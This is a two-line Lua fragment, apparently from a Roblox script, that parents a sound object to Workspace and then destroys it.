sound.Parent = Workspace
sound:Destroy()
